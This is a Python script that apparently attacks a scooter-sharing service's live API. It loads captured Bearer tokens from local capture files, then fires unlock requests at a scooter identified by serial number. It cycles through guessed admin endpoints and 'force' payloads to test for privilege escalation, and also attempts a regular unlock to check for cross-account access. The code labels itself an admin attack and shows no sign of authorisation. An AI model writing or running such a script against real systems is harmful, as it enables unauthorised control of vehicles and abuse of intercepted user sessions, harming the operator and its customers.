#!/usr/bin/env python3
"""
SXB306 Admin Unlock Test
Attempts to unlock SXB306 using admin privileges with captured token
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# SXB306 Scooter Configuration
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 48.8566,  # Paris coordinates
    "lng": 2.3522
}

def extract_latest_token():
    """Extract the latest token from capture files"""
    print("[SEARCH] Extracting latest token...")
    
    # Try LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found token in LATEST_TOKEN.txt: {token[:50]}...")
            return token
    except:
        pass
    
    # Fallback to capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                token = tokens[-1]  # Get the most recent
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
        except:
            continue
    
    print("[ERROR] No Bearer tokens found")
    return None

def test_sxb306_admin_unlock(token):
    """Attempt to unlock SXB306 using admin privileges"""
    print("=" * 80)
    print("[ADMIN ATTACK] SXB306 ADMIN UNLOCK TEST")
    print("=" * 80)
    print(f"[TARGET] Scooter: {SXB306_SCOOTER['serial']}")
    print(f"[LOCATION] Lat: {SXB306_SCOOTER['lat']}, Lng: {SXB306_SCOOTER['lng']}")
    print(f"[TOKEN] {token[:50]}...")
    print(f"[ADMIN] Using admin unlock endpoint")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Admin unlock payload variations to test
    admin_payloads = [
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "force": True
        },
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "force": False
        },
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng']
        },
        {
            "vehicle_id": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "force": True
        }
    ]
    
    # Test multiple admin endpoint variations
    admin_endpoints = [
        "/api/application/vehicles/unlock/admin",
        "/api/admin/vehicles/unlock",
        "/api/application/admin/vehicles/unlock",
        "/api/vehicles/admin/unlock",
        "/api/admin/unlock"
    ]
    
    for endpoint in admin_endpoints:
        for i, admin_payload in enumerate(admin_payloads, 1):
            print(f"\n[ADMIN TEST {i}] Trying endpoint: {endpoint}")
            print(f"   Payload: {json.dumps(admin_payload, indent=2)}")
            
            try:
                response = requests.post(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    json=admin_payload,
                    timeout=15
                )
                
                print(f"   Status: {response.status_code}")
                print(f"   Response: {response.text}")
                
                if response.status_code == 200:
                    print(f"[SUCCESS] SXB306 ADMIN UNLOCKED via {endpoint}!")
                    print("[CRITICAL] ADMIN PRIVILEGE ESCALATION CONFIRMED!")
                    return True
                elif response.status_code == 401:
                    print(f"[ERROR] Token expired/invalid")
                    return False
                elif response.status_code == 403:
                    print(f"[ERROR] Admin permission denied - token lacks admin privileges")
                    break  # Try next endpoint
                elif response.status_code == 400:
                    print(f"[ERROR] Bad request - trying next payload...")
                    try:
                        error_data = response.json()
                        print(f"   Error: {error_data}")
                    except:
                        print(f"   Raw error: {response.text}")
                    continue  # Try next payload
                else:
                    print(f"[ERROR] Unexpected response: {response.status_code}")
                    continue  # Try next payload
                    
            except Exception as e:
                print(f"[ERROR] Request failed: {e}")
                continue  # Try next payload
    
    return False

def test_regular_unlock_for_comparison(token):
    """Test regular unlock for comparison"""
    print("\n" + "=" * 80)
    print("[COMPARISON] REGULAR UNLOCK TEST")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Regular unlock payload
    regular_payload = {
        "serial_number": SXB306_SCOOTER['serial'],
        "lat": SXB306_SCOOTER['lat'],
        "lng": SXB306_SCOOTER['lng']
    }
    
    print(f"[REGULAR TEST] Trying regular unlock payload:")
    print(f"   {json.dumps(regular_payload, indent=2)}")
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=regular_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"[SUCCESS] SXB306 REGULAR UNLOCKED!")
            return True
        else:
            print(f"[FAILED] Regular unlock failed: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Regular unlock request failed: {e}")
        return False

def main():
    print("=" * 80)
    print("[SXB306] ADMIN UNLOCK TEST")
    print("=" * 80)
    print("[WARNING] Testing admin privilege escalation!")
    print("[WARNING] This attempts to unlock SXB306 with admin privileges!")
    print("=" * 80)
    
    # Extract token
    token = extract_latest_token()
    if not token:
        print("[ERROR] No token found. Please capture a fresh token first.")
        return
    
    # Test admin unlock
    admin_success = test_sxb306_admin_unlock(token)
    
    # Test regular unlock for comparison
    regular_success = test_regular_unlock_for_comparison(token)
    
    print("\n" + "=" * 80)
    print("[RESULTS] SXB306 UNLOCK TEST RESULTS")
    print("=" * 80)
    
    if admin_success:
        print("[CRITICAL] ADMIN UNLOCK SUCCESSFUL!")
        print("[CRITICAL] PRIVILEGE ESCALATION VULNERABILITY CONFIRMED!")
        print("[CRITICAL] Regular users can perform admin operations!")
    elif regular_success:
        print("[WARNING] REGULAR UNLOCK SUCCESSFUL!")
        print("[WARNING] Cross-account access vulnerability confirmed!")
        print("[INFO] Admin unlock failed (expected - token lacks admin privileges)")
    else:
        print("[OK] Both admin and regular unlock failed")
        print("[OK] Security appears to be working properly")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
